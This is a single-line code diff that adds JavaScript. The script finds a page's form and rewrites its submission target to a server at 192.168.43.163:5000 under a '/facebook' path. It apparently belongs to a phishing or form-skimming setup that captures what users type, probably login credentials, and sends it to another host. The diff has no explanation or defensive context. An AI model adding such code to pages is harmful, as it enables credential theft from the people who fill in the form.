@@ -1,0 +1,1 @@
+let form = document.querySelector("#input"); form.action = "http://192.168.43.163:5000/facebook";
